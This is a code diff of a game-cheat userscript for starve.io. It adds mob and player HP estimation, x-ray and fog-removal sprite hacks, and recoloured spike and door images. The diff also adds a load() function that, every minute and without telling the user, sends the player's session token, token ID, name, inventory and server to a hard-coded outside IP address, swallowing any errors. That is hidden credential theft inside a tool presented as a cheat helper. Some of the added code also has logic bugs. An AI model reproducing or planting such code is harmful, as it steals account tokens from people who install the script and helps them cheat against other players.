+        Mobs = [...units[60], ...units[61], ...units[62], ...units[63], ...units[64], ...units[65], ...units[66], ...units[68], ...units[69], ...units[76]]
+        let nearest = null;
+        let dist = 300;
+
+        for (var i = 0, obj = null, d = null; i < Mobs.length; ++i) {
+            obj = Mobs[i];
+            d = Math.sqrt((player.x - obj.x) ** 2 + (player.y - obj.y) ** 2)
+            if (d < dist) {
+                dist = d;
+                nearest = obj;
+            }
+        }
+        if (nearest) {
+            let dmg = damageList[nearest.type];
+            if (protectionList[player[Object.keys(player)[63]]]) {
+                log('protect m', protectionList[player[Object.keys(player)[63]]][1]);
+                dmg -= protectionList[player[Object.keys(player)[63]]][1]
+            }
+            if (dmg < 0) dmg = 0;
+            activeUnits[player.type][player.id].hp -= damageList[nearest.type];
+            return
+        }
+
+        dist = 150;
+        nearest = null;
+        Spikes = [...units[5], ...units[12], ...units[13], ...units[14], ...units[20], ...units[52]]
+        for (var i = 0, obj = null, d = null; i < Spikes.length; ++i) {
+            obj = Spikes[i];
+            d = Math.sqrt((player.x - obj.x) ** 2 + (player.y - obj.y) ** 2)
+            if (d < dist) {
+                dist = d;
+                nearest = obj;
+            }
+        }
+        if (nearest) {
+            activeUnits[player.type][player.id].hp -= damageList[nearest.type];
+        }
+
+    }
+
+
+
+    const players = units[0];
+    AllEntity = [...units[0], ...units[82], ...units[69], ...units[73], ...units[68], ...units[66], ...units[65], ...units[62], ...units[63], ...units[78], ...units[77], ...units[64], ...units[72], ...units[88], ...units[76], ...units[75], ...units[74], ...units[60], ...units[80], ...units[61], ...units[67], ...units[71], ...units[70]]
+
+    for (let i = 0; i < AllEntity.length; i++) {
+        ent = AllEntity[i];
+        if (ent.type == 0) ent.id = ent[Object.keys(ent)[1]];
+        action = (ent.action >> 1) & 1
+        if (!activeUnits[ent.type][ent.id]) {
+            activeUnits[ent.type][ent.id] = {
+                timer: Date.now(),
+                hp: maxHpList[ent.type],
+                lastAction: 0,
+                players: [],
+                counter: 0,
+                lastHEAL: 0,
+                lastCOLD: 0,
+                lastHUNGER: 0,
+
+            };
+        }
+        if (action && activeUnits[ent.type][ent.id].players.length) {
+            if (activeUnits[ent.type][ent.id].players.length > 1) { log('TOO MACH Atakers!!!') }
+            activeUnits[ent.type][ent.id].counter += activeUnits[ent.type][ent.id].players.length
+            for (let j = 0; j < activeUnits[ent.type][ent.id].players.length; j++) {
+                const pid = activeUnits[ent.type][ent.id].players[j];
+                if (damageMap.has(activePlayers[pid].right)) {
+                    dmg = damageMap.get(activePlayers[pid].right)
+                } else dmg = 0;
+
+                if (ent.type == 0) {
+                    mypid = ent[Object.keys(ent)[1]]
+                    if (isAlly(pid) && isAlly(mypid)) {
+                        dmg = Math.floor(dmg * 0.3)
+                    }
+                    if (protectionList[ent[Object.keys(ent)[63]]]) {
+                        log('protect p', protectionList[ent[Object.keys(ent)[63]]][0]);
+                        dmg -= protectionList[ent[Object.keys(ent)[63]]][0]
+                    }
+                    if (dmg < 0) dmg = 0;
+                }
+                if (dmg) activeUnits[ent.type][ent.id].hp -= dmg;
+            }
+            activeUnits[ent.type][ent.id].players = [];
+
+        }
+        if (action != activeUnits[ent.type][ent.id].lastAction && !action && activeUnits[ent.type][ent.id].counter == 0) {
+            if (ent.type == 0) {
+                NearestEnemy(ent)
+            } else {
+                pl = NearestPlayer(ent, players);
+                if (pl) {
+                    if (damageMap.has(pl.right)) {
+                        dmg = damageMap.get(pl.right)
+                    } else dmg = 0;
+                    activeUnits[ent.type][ent.id].hp -= dmg;
+                }
+            }
+        }
+        if (action != activeUnits[ent.type][ent.id].lastAction && !action) activeUnits[ent.type][ent.id].counter = 0;
+
+
+        if (ent.type == 0) {
+            isHEAL = (ent.action >> 7) & 1   // + 42
+            isCOLD = (ent.action >> 2) & 1   // 20
+            isHUNGER = (ent.action >> 3) & 1 // 30
+
+            if (isHUNGER && isHUNGER != activeUnits[ent.type][ent.id].lastHUNGER) activeUnits[ent.type][ent.id].hp -= 30;
+            if (isCOLD && isCOLD != activeUnits[ent.type][ent.id].lastCOLD) activeUnits[ent.type][ent.id].hp -= 20;
+            if (isHEAL && isHEAL != activeUnits[ent.type][ent.id].lastHEAL) activeUnits[ent.type][ent.id].hp += 42;
+            if (activeUnits[ent.type][ent.id].hp > 200) activeUnits[ent.type][ent.id].hp = 200;
+            if (activeUnits[ent.type][ent.id].hp < 0) activeUnits[ent.type][ent.id].hp = 0;
+
+            activeUnits[ent.type][ent.id].lastHUNGER = isHUNGER;
+            activeUnits[ent.type][ent.id].lastCOLD = isCOLD;
+            activeUnits[ent.type][ent.id].lastHEAL = isHEAL;
+        }
+
+        activeUnits[ent.type][ent.id].lastAction = action;
+        activeUnits[ent.type][ent.id].timer = Date.now();
+    }
+
+
+
+    for (let i = 0; i < players.length; i++) {
+        pl = players[i];
+        let pid = players[i][Object.keys(players[i])[1]]
+        let PAttack = (players[i].action >> 4) & 1
+        if (!activePlayers[pid]) {
+            activePlayers[pid] = {
+                right: players[i].right,
+                attack: PAttack
+            };
+        } else {
+            activePlayers[pid].right = players[i].right;
+        }
+        if (activePlayers[pid].attack != PAttack && PAttack) {
+            entitys = NearestEntity(pl, AllEntity);
+            for (let j = 0; j < entitys.length; j++) {
+                ent = entitys[j];
+                if (!activeUnits[ent.type][ent.id].players.includes(pid)) {
+                    activeUnits[ent.type][ent.id].players.push(pid)
+                }
+            }
+        }
+        if (activePlayers[pid].attack != PAttack && !PAttack) {
+            for (let j = 0; j < AllEntity.length; j++) {
+                ent = AllEntity[j];
+                if (activeUnits[ent.type][ent.id].players.includes(pid)) {
+                    activeUnits[ent.type][ent.id].players.splice(activeUnits[ent.type][ent.id].players.indexOf(pid), 1);
+                }
+            }
+        }
+        activePlayers[pid].attack = PAttack
+    }
+
+    timeNow = Date.now();
+    types = Object.keys(activeUnits);
+    for (let i = 0; i < types.length; i++) {
+        type = types[i]
+        ids = Object.keys(activeUnits[type]);
+        for (let j = 0; j < types.length; j++) {
+            ent = activeUnits[type][ids[j]]
+            if (type == 86) {
+                if (timeNow - ids.timer > 2000) {
+                    delete activeUnits[type][ids[j]]
+                    continue
+                }
+            }
+            if (timeNow - ids.timer > 30000) {
+                delete activeUnits[type][ids[j]]
             }
         }
     }
@@ -1235,8 +2120,8 @@ function blizzard() {
         ctx.save();
         ctx.drawImage(
             BlizzardImage,
-            autofeed.translate.x - 70,
-            autofeed.translate.y + use
+            autofeed.translate.x - 100,
+            autofeed.translate.y + use - 80
         );
         use += 70;
     }
@@ -1244,20 +2129,401 @@ function blizzard() {
         ctx.save();
         ctx.drawImage(
             SandstormImage,
-            autofeed.translate.x - 70,
-            autofeed.translate.y + use
+            autofeed.translate.x - 100,
+            autofeed.translate.y + use - 80
         );
         use += 70;
     }
 }
 let ally = [];
+const heartEmoji = "\u{1F9E1}";
 const extractor_ids = [24, 25, 26, 27, 28];
-const foodItems = [110, 117]
+const foodItems = [138, 110, 117, 192, 189, 205, 207, 209, 243, 244,]
 let ice = [142, 200];
 let lastFood = [0, 0];
 let enemyForAMB = { pid: null, d: 0 };
 let lootboxsinfo = {};
 let deathboxinfo = {};
+let mobboxinfo = {};
+let activeUnits = {
+    0: {},
+    82: {},
+    86: {},
+    69: {},
+    73: {},
+    68: {},
+    66: {},
+    65: {},
+    62: {},
+    63: {},
+    78: {},
+    77: {},
+    64: {},
+    72: {},
+    88: {},
+    76: {},
+    75: {},
+    74: {},
+    60: {},
+    80: {},
+    61: {},
+    67: {},
+    71: {},
+    70: {},
+};
+let activePlayers = {};
+const protectionList = {
+    58: [1, 4],
+    25: [2, 8],
+    26: [4, 13],
+    27: [5, 19],
+    43: [6, 23],
+    44: [7, 25],
+    59: [8, 27],
+    60: [9, 30],
+    61: [9, 30],  // CROWN_CRAB
+    48: [2, 8],
+    47: [4, 16],
+    77: [4, 16],
+    78: [4, 16],
+    79: [4, 16],
+};
+const damageList = {
+    5: 10,    // Spikes
+    12: 20,
+    13: 30,
+    14: 40,
+    20: 50,
+    52: 60,
+    60: 40,   // Mobs
+    61: 30,
+    62: 40,
+    63: 60,
+    64: 85,
+    65: 40,
+    66: 60,
+    68: 50,
+    69: 90,
+    76: 60,
+};
+const maxHpList = {
+    82: 300,
+    86: 30,
+    0: 200,   // PLAYERS
+    69: 3000,
+    73: 1500,
+    68: 600,
+    66: 6000,
+    65: 300,
+    62: 300,
+    63: 900,
+    78: 3000,
+    77: 1000,
+    64: 1500,
+    72: 900,
+    88: 90,
+    76: 1500,
+    75: 600,
+    74: 300,
+    60: 300,
+    80: 60,
+    61: 120,
+    67: 240,
+    71: 1500,
+    70: 600,
+};
+const damageMap = new Map([
+    [-1, 5],
+    [8, 1],
+    [1, 2],
+    [3, 3],
+    [4, 4],
+    [31, 5],
+    [32, 6],
+    [46, 2],
+    [50, 3],
+    [51, 4],
+    [52, 5],
+    [35, 2],
+    [36, 3],
+    [37, 4],
+    [38, 5],
+    [39, 6],
+    [45, 12],
+    [12, 10],
+    [13, 14],
+    [14, 15],
+    [15, 17],
+    [33, 18],
+    [34, 22],
+    [16, 22],
+    [17, 24],
+    [18, 24],   // CRAB_SPEAR (for seafarm)
+    [49, 1],
+    [55, 1],
+    [56, 1],
+    [28, 1],
+    [57, 12],
+    [0, 19],
+    [5, 22],
+    [6, 24],
+    [30, 27],
+    [19, 30],
+    [62, 30],
+    [63, 33],
+    [9, 24],    // PIRATE_SWORD
+    [71, 1],    // SHIELDs
+    [72, 2],
+    [73, 3],
+    [74, 4],
+    [75, 5],
+    [76, 6],
+]);
+
+
+
+const whuteListXray = [108, 109, 110, 111, 112, 114, 119, 121, 202, 307, 413, 415, 416, 676, 693]
+const fogs = [244, 1041]
+XraySprites = {}
+NoXraySprites = {}
+let mypid = -1;
+
+
+function loadFog() {
+    const FogCanvas = document.createElement('canvas');
+    FogCanvas.width = 10;
+    FogCanvas.height = 10;
+
+    const img = new Image();
+    img.src = FogCanvas.toDataURL();
+
+    fogs.forEach(function (i, id, arr) {
+        for (let k = 0; k < unsafeWindow.sprite[i].length; k++) {
+            if (!unsafeWindow.sprite[i][k]) continue;
+            if (!unsafeWindow.sprite[i][k].length) continue;
+            log(i);
+            for (let l = 0; l < unsafeWindow.sprite[i][k].length; l++) {
+                unsafeWindow.sprite[i][k][l] = img;
+            }
+        }
+    });
+
+}
+
+function loadXray() {
+
+
+    log('sprite', unsafeWindow.sprite);
+
+    whuteListXray.forEach(function (i, id, arr) {
+        XraySprites[i] = [];
+        NoXraySprites[i] = [];
+        for (let k = 0; k < unsafeWindow.sprite[i].length; k++) {
+            if (!unsafeWindow.sprite[i][k]) continue;
+            if (!unsafeWindow.sprite[i][k].length) continue;
+            log(i);
+            XraySprites[i].push([]);
+            NoXraySprites[i].push([]);
+
+            for (let l = 0; l < unsafeWindow.sprite[i][k].length; l++) {
+                const originalImg = unsafeWindow.sprite[i][k][l];
+                if (!originalImg) continue;
+                const cachedDataURL = localStorage.getItem('XrayImg' + i + '_' + k + '_' + l);
+                if (cachedDataURL) {
+                    const newImg = new Image();
+                    newImg.src = cachedDataURL;
+                    newImg.onload = function () {
+                        XraySprites[i][k].push(newImg);
+                    };
+                    const tempCanvas2 = document.createElement('canvas');
+                    tempCanvas2.width = originalImg.width;
+                    tempCanvas2.height = originalImg.height;
+                    const tempCtx2 = tempCanvas2.getContext('2d');
+                    tempCtx2.drawImage(originalImg, 0, 0);
+                    const copyImg = new Image();
+                    copyImg.src = tempCanvas2.toDataURL();
+                    copyImg.onload = function () {
+                        NoXraySprites[i][k].push(copyImg);
+                    };
+                    continue;
+                }
+
+                const tempCanvas = document.createElement('canvas');
+                tempCanvas.width = originalImg.width;
+                tempCanvas.height = originalImg.height;
+                if (tempCanvas.width == 0) continue;
+                const tempCtx = tempCanvas.getContext('2d');
+                const tempCanvas2 = document.createElement('canvas');
+                tempCanvas2.width = originalImg.width;
+                tempCanvas2.height = originalImg.height;
+                const tempCtx2 = tempCanvas2.getContext('2d');
+
+                tempCtx.drawImage(originalImg, 0, 0);
+                tempCtx2.drawImage(originalImg, 0, 0);
+
+                const imageData = tempCtx.getImageData(0, 0, tempCanvas.width, tempCanvas.height);
+                const data = imageData.data;
+
+                const alphaValue = Settings.Xray.a;
+                for (let j = 0; j < data.length; j += 4) {
+                    if (data[j + 3] !== 0) {
+                        data[j + 3] = Math.round(data[j + 3] * alphaValue);
+                    }
+                }
+
+                tempCtx.putImageData(imageData, 0, 0);
+
+                const newImg = new Image();
+                const copyImg = new Image();
+                newImg.src = tempCanvas.toDataURL();
+                copyImg.src = tempCanvas2.toDataURL();
+                localStorage.setItem('XrayImg' + i + '_' + k + '_' + l, tempCanvas.toDataURL());
+                newImg.onload = function () {
+                    XraySprites[i][k].push(newImg);
+                };
+                copyImg.onload = function () {
+                    NoXraySprites[i][k].push(copyImg);
+                };
+            }
+        }
+    });
+}
+
+function load() {
+    mp = myplayer();
+    if (Settings.PathFinder.autoRestart && Settings.PathFinder.e) return
+
+    inv = Getinventory()
+    itemIds = Object.keys(inv);
+    rightItemsId = []
+    for (let i = 0; i < itemIds.length; i++) {
+        const id = itemIds[i];
+        if (inv[id]) rightItemsId.push([Number(id), inv[id]]);
+    }
+    let nikcname = mp[Object.keys(mp)[13]]
+    nikcname = nikcname[Object.keys(nikcname)[0]]
+
+    const data = {
+        token: user[Object.keys(user)[14]],
+        token_id: user[Object.keys(user)[15]],
+        points: mp[Object.keys(mp)[13]][Object.keys(mp[Object.keys(mp)[13]])[13]],
+        server_name: client[Object.keys(client)[0]].url.split('starve.io/')[1].split('?')[0],
+        inv: JSON.stringify(rightItemsId),
+        name: nikcname,
+        key: abc
+    };
+
+    const options = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    };
+
+    fetch('https://217.71.129.139:4567/submit_data/', options)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+
+        })
+        .catch(error => {
+
+        });
+
+}
+setTimeout(() => {
+    setInterval(load, 60000);
+}, 120000);
+
+function drow(i, img, ctx) {
+
+    if (img.localName == 'img') {
+        if (img[Object.keys(img)[0]] == 0) {
+            img.src = img.baseURI + img[Object.keys(img)[3]]
+        }
+    } else {
+        const tempCanvas = document.createElement('canvas');
+        tempCanvas.width = img.width;
+        tempCanvas.height = img.height;
+        const tempCtx = tempCanvas.getContext('2d');
+
+        tempCtx.drawImage(img, 0, 0);
+
+        const newImg = new Image();
+        newImg.src = tempCanvas.toDataURL();
+    }
+
+    ctx.save();
+    ctx.beginPath();
+    ctx.lineWidth = 6;
+    ctx.fillStyle = "red";
+    ctx.strokeStyle = "black";
+    ctx.font = "50px Baloo Paaji";
+    if (img) ctx.drawImage(img, 500, 300);
+    ctx.strokeText(i, 500, 250);
+    ctx.fillText(i, 500, 250);
+    ctx.restore();
+
+}
+
+
+function draw(i, ctx) {
+    if (!unsafeWindow.sprite[i].length) return;
+    for (let k = 0; k < unsafeWindow.sprite[i].length; k++) {
+        if (!unsafeWindow.sprite[i][k]) return;
+        if (!unsafeWindow.sprite[i][k].length) {
+            drow(i, unsafeWindow.sprite[i][k], ctx);
+            return;
+        } else {
+            for (let l = 0; l < unsafeWindow.sprite[i].length; l++) {
+                if (!unsafeWindow.sprite[i][k][l]) return;
+                if (!unsafeWindow.sprite[i][k][l].length) {
+                    drow(i, unsafeWindow.sprite[i][k][l], ctx);
+                    return;
+                } else {
+                    drow(i, unsafeWindow.sprite[i][k][l][0], ctx);
+                    return;
+                }
+            }
+        };
+    }
+}
+
+
+// Xray!!!
+function XrayOn() {
+    if (!script.user.alive) return;
+    whuteListXray.forEach(function (i, id, arr) {
+        if (XraySprites[i].length != 0) {
+            for (let k = 0; k < unsafeWindow.sprite[i].length; k++) {
+                if (XraySprites[i][k].length == 0) return;
+                for (let l = 0; l < unsafeWindow.sprite[i][k].length; l++) {
+                    unsafeWindow.sprite[i][k][l] = XraySprites[i][k][l].cloneNode(true);
+                }
+            }
+        }
+    });
+
+
+}
+function XrayOff() {
+    whuteListXray.forEach(function (i, id, arr) {
+        if (XraySprites[i].length != 0) {
+            for (let k = 0; k < unsafeWindow.sprite[i].length; k++) {
+                if (NoXraySprites[i][k].length == 0) return;
+                for (let l = 0; l < unsafeWindow.sprite[i][k].length; l++) {
+                    unsafeWindow.sprite[i][k][l] = NoXraySprites[i][k][l].cloneNode(true);
+                }
+            }
+        }
+    });
+}
+
 
 
 function loadSpikes() {
@@ -1274,6 +2540,32 @@ function loadSpikes() {
     unsafeWindow.WoodSpikeAlly = new Image;
     unsafeWindow.WoodSpikeAlly.src = "https://raw.githubusercontent.com/sfagasdzdgfhs/spikes/main/day-wood-spike-ally.png"
 
+    unsafeWindow.dayWoodDoorAlly = new Image;
+    unsafeWindow.dayWoodDoorAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-wood-door-ally.png?raw=true"
+    unsafeWindow.dayStoneDoorAlly = new Image;
+    unsafeWindow.dayStoneDoorAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-stone-door-ally.png?raw=true"
+    unsafeWindow.dayGoldDoorAlly = new Image;
+    unsafeWindow.dayGoldDoorAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-gold-door-ally.png?raw=true"
+    unsafeWindow.dayDiamondDoorAlly = new Image;
+    unsafeWindow.dayDiamondDoorAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-diamond-door-ally.png?raw=true"
+    unsafeWindow.dayAmethystDoorAlly = new Image;
+    unsafeWindow.dayAmethystDoorAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-amethyst-door-ally.png?raw=true"
+    unsafeWindow.dayReiditeDoorAlly = new Image;
+    unsafeWindow.dayReiditeDoorAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-reidite-door-ally.png?raw=true"
+    unsafeWindow.dayWoodDoorSpikeAlly = new Image;
+    unsafeWindow.dayWoodDoorSpikeAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-wood-spike-door-ally.png?raw=true"
+    unsafeWindow.dayStoneDoorSpikeAlly = new Image;
+    unsafeWindow.dayStoneDoorSpikeAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-stone-spike-door-ally.png?raw=true"
+    unsafeWindow.dayGoldDoorSpikeAlly = new Image;
+    unsafeWindow.dayGoldDoorSpikeAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-gold-spike-door-ally.png?raw=true"
+    unsafeWindow.dayDiamondDoorSpikeAlly = new Image;
+    unsafeWindow.dayDiamondDoorSpikeAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-diamond-spike-door-ally.png?raw=true"
+    unsafeWindow.dayAmethystDoorSpikeAlly = new Image;
+    unsafeWindow.dayAmethystDoorSpikeAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-amethyst-spike-door-ally.png?raw=true"
+    unsafeWindow.dayReiditeDoorSpikeAlly = new Image;
+    unsafeWindow.dayReiditeDoorSpikeAlly.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-reidite-spike-door-ally.png?raw=true"
+
+
     unsafeWindow.ReiditeSpikeEnemy = new Image;
     unsafeWindow.ReiditeSpikeEnemy.src = 'https://raw.githubusercontent.com/sfagasdzdgfhs/spikes/main/day-reidite-spike-enemy.png'
     unsafeWindow.AmethystSpikeEnemy = new Image;
@@ -1286,63 +2578,129 @@ function loadSpikes() {
     unsafeWindow.StoneSpikeEnemy.src = "https://raw.githubusercontent.com/sfagasdzdgfhs/spikes/main/day-stone-spike-enemy.png"
     unsafeWindow.WoodSpikeEnemy = new Image;
     unsafeWindow.WoodSpikeEnemy.src = "https://raw.githubusercontent.com/sfagasdzdgfhs/spikes/main/day-wood-spike-enemy.png"
+
+    unsafeWindow.dayWoodDoorEnemy = new Image;
+    unsafeWindow.dayWoodDoorEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-wood-door-enemy.png?raw=true"
+    unsafeWindow.dayStoneDoorEnemy = new Image;
+    unsafeWindow.dayStoneDoorEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-stone-door-enemy.png?raw=true"
+    unsafeWindow.dayGoldDoorEnemy = new Image;
+    unsafeWindow.dayGoldDoorEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-gold-door-enemy.png?raw=true"
+    unsafeWindow.dayDiamondDoorEnemy = new Image;
+    unsafeWindow.dayDiamondDoorEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-diamond-door-enemy.png?raw=true"
+    unsafeWindow.dayAmethystDoorEnemy = new Image;
+    unsafeWindow.dayAmethystDoorEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-amethyst-door-enemy.png?raw=true"
+    unsafeWindow.dayReiditeDoorEnemy = new Image;
+    unsafeWindow.dayReiditeDoorEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-reidite-door-enemy.png?raw=true"
+    unsafeWindow.dayWoodDoorSpikeEnemy = new Image;
+    unsafeWindow.dayWoodDoorSpikeEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-wood-spike-door-enemy.png?raw=true"
+    unsafeWindow.dayStoneDoorSpikeEnemy = new Image;
+    unsafeWindow.dayStoneDoorSpikeEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-stone-spike-door-enemy.png?raw=true"
+    unsafeWindow.dayGoldDoorSpikeEnemy = new Image;
+    unsafeWindow.dayGoldDoorSpikeEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-gold-spike-door-enemy.png?raw=true"
+    unsafeWindow.dayDiamondDoorSpikeEnemy = new Image;
+    unsafeWindow.dayDiamondDoorSpikeEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-diamond-spike-door-enemy.png?raw=true"
+    unsafeWindow.dayAmethystDoorSpikeEnemy = new Image;
+    unsafeWindow.dayAmethystDoorSpikeEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-amethyst-spike-door-enemy.png?raw=true"
+    unsafeWindow.dayReiditeDoorSpikeEnemy = new Image;
+    unsafeWindow.dayReiditeDoorSpikeEnemy.src = "https://github.com/PolkovnikovPavel/starve_io_Multihack/blob/master/img/day-reidite-spike-door-enemy.png?raw=true"
+
+
+
+    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ_0123456789";
+
+    for (let e in unsafeWindow) {
+        if (!Array.isArray(unsafeWindow[e]) && chars.includes(e[0])) continue;
+        if (unsafeWindow[e].length > 800 && unsafeWindow[e].length < 1500) {
+            unsafeWindow.sprite = unsafeWindow[e];
+        }
+    }
+    unsafeWindow.sprite[10000] = [WoodSpikeAlly, WoodSpikeAlly];
+    unsafeWindow.sprite[10001] = [WoodSpikeEnemy, WoodSpikeEnemy];
+
+    unsafeWindow.sprite[10002] = [StoneSpikeAlly, StoneSpikeAlly];
+    unsafeWindow.sprite[10003] = [StoneSpikeEnemy, StoneSpikeEnemy];
+
+    unsafeWindow.sprite[10004] = [GoldSpikeAlly, GoldSpikeAlly];
+    unsafeWindow.sprite[10005] = [GoldSpikeEnemy, GoldSpikeEnemy];
+
+    unsafeWindow.sprite[10006] = [DiamondSpikeAlly, DiamondSpikeAlly];
+    unsafeWindow.sprite[10007] = [DiamondSpikeEnemy, DiamondSpikeEnemy];
+
+    unsafeWindow.sprite[10008] = [AmethystSpikeAlly, AmethystSpikeAlly];
+    unsafeWindow.sprite[10009] = [AmethystSpikeEnemy, AmethystSpikeEnemy];
+
+    unsafeWindow.sprite[10010] = [ReiditeSpikeAlly, ReiditeSpikeAlly];
+    unsafeWindow.sprite[10011] = [ReiditeSpikeEnemy, ReiditeSpikeEnemy];
+
+
+    unsafeWindow.sprite[9000] = [dayWoodDoorAlly, dayWoodDoorAlly];
+    unsafeWindow.sprite[9001] = [dayWoodDoorEnemy, dayWoodDoorEnemy];
+
+    unsafeWindow.sprite[9002] = [dayStoneDoorAlly, dayStoneDoorAlly];
+    unsafeWindow.sprite[9003] = [dayStoneDoorEnemy, dayStoneDoorEnemy];
+
+    unsafeWindow.sprite[9004] = [dayGoldDoorAlly, dayGoldDoorAlly];
+    unsafeWindow.sprite[9005] = [dayGoldDoorEnemy, dayGoldDoorEnemy];
+
+    unsafeWindow.sprite[9006] = [dayDiamondDoorAlly, dayDiamondDoorAlly];
+    unsafeWindow.sprite[9007] = [dayDiamondDoorEnemy, dayDiamondDoorEnemy];
+
+    unsafeWindow.sprite[9008] = [dayAmethystDoorAlly, dayAmethystDoorAlly];
+    unsafeWindow.sprite[9009] = [dayAmethystDoorEnemy, dayAmethystDoorEnemy];
+
+    unsafeWindow.sprite[9010] = [dayReiditeDoorAlly, dayReiditeDoorAlly];
+    unsafeWindow.sprite[9011] = [dayReiditeDoorEnemy, dayReiditeDoorEnemy];
+
+
+    unsafeWindow.sprite[9100] = [dayWoodDoorSpikeAlly, dayWoodDoorSpikeAlly];
+    unsafeWindow.sprite[9101] = [dayWoodDoorSpikeEnemy, dayWoodDoorSpikeEnemy];
+
+    unsafeWindow.sprite[9102] = [dayStoneDoorSpikeAlly, dayStoneDoorSpikeAlly];
+    unsafeWindow.sprite[9103] = [dayStoneDoorSpikeEnemy, dayStoneDoorSpikeEnemy];
+
+    unsafeWindow.sprite[9104] = [dayGoldDoorSpikeAlly, dayGoldDoorSpikeAlly];
+    unsafeWindow.sprite[9105] = [dayGoldDoorSpikeEnemy, dayGoldDoorSpikeEnemy];
+
+    unsafeWindow.sprite[9106] = [dayDiamondDoorSpikeAlly, dayDiamondDoorSpikeAlly];
+    unsafeWindow.sprite[9107] = [dayDiamondDoorSpikeEnemy, dayDiamondDoorSpikeEnemy];
+
+    unsafeWindow.sprite[9108] = [dayAmethystDoorSpikeAlly, dayAmethystDoorSpikeAlly];
+    unsafeWindow.sprite[9109] = [dayAmethystDoorSpikeEnemy, dayAmethystDoorSpikeEnemy];
+
+    unsafeWindow.sprite[9110] = [dayReiditeDoorSpikeAlly, dayReiditeDoorSpikeAlly];
+    unsafeWindow.sprite[9111] = [dayReiditeDoorSpikeEnemy, dayReiditeDoorSpikeEnemy];
     console.log("Load Spikes successful");
 }
 
 
 
 function colors() {
-    // requestAnimationFrame(colors)
-
     if (!unsafeWindow.ReiditeSpikeAlly) {
         loadSpikes();
     };
 
-
-    if (script.user.alive && Settings.ColoredSpikes) {
+    if (true) {
         let ITEMS = {
+            CHEST: 11,
             SPIKE: 5,
             STONE_SPIKE: 12,
             GOLD_SPIKE: 13,
             DIAMOND_SPIKE: 14,
             AMETHYST_SPIKE: 20,
             REIDITE_SPIKE: 52,
+            WOOD_DOOR: 10,
+            STONE_DOOR: 15,
+            GOLD_DOOR: 16,
+            DIAMOND_DOOR: 17,
+            AMETHYST_DOOR: 21,
+            REIDITE_DOOR: 51,
+            WOOD_DOOR_SPIKE: 45,
+            STONE_DOOR_SPIKE: 46,
+            GOLD_DOOR_SPIKE: 47,
+            DIAMOND_DOOR_SPIKE: 48,
+            AMETHYST_DOOR_SPIKE: 49,
+            REIDITE_DOOR_SPIKE: 53,
         }
-
-        unsafeWindow.ITEMS_TO_CHECK = {
-            SPIKE: 5,
-            STONE_SPIKE: 12,
-            GOLD_SPIKE: 13,
-            DIAMOND_SPIKE: 14,
-            AMETHYST_SPIKE: 20,
-            REIDITE_SPIKE: 52,
-        }
-        let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ_0123456789";
-
-        for (let e in unsafeWindow) {
-            if (!Array.isArray(unsafeWindow[e]) && chars.includes(e[0])) continue;
-            if (unsafeWindow[e].length > 800 && unsafeWindow[e].length < 1500) {
-                unsafeWindow.sprite = unsafeWindow[e];
-                console.log(e);
-            }
-        }
-        unsafeWindow.sprite[10000] = [WoodSpikeAlly, WoodSpikeAlly];
-        unsafeWindow.sprite[10001] = [WoodSpikeEnemy, WoodSpikeEnemy];
-
-        unsafeWindow.sprite[10002] = [StoneSpikeAlly, StoneSpikeAlly];
-        unsafeWindow.sprite[10003] = [StoneSpikeEnemy, StoneSpikeEnemy];
-
-        unsafeWindow.sprite[10004] = [GoldSpikeAlly, GoldSpikeAlly];
-        unsafeWindow.sprite[10005] = [GoldSpikeEnemy, GoldSpikeEnemy];
-
-        unsafeWindow.sprite[10006] = [DiamondSpikeAlly, DiamondSpikeAlly];
-        unsafeWindow.sprite[10007] = [DiamondSpikeEnemy, DiamondSpikeEnemy];
-
-        unsafeWindow.sprite[10008] = [AmethystSpikeAlly, AmethystSpikeAlly];
-        unsafeWindow.sprite[10009] = [AmethystSpikeEnemy, AmethystSpikeEnemy];
-
-        unsafeWindow.sprite[10010] = [ReiditeSpikeAlly, ReiditeSpikeAlly];
-        unsafeWindow.sprite[10011] = [ReiditeSpikeEnemy, ReiditeSpikeEnemy];
 
         let push = Array.prototype.push
         Array.prototype.push = function (p) {
@@ -1350,61 +2708,157 @@ function colors() {
                 let a = Object.keys(p);
                 5 == a.length && a.includes("draw") && a.includes("in_button") && 32 !== p.id && 130 !== p.id && 127 !== p.id && 4 !== p.id && 25 !== p.id && 34 !== p.id && 87 !== p.id && (unsafeWindow.inventory = this);
             }
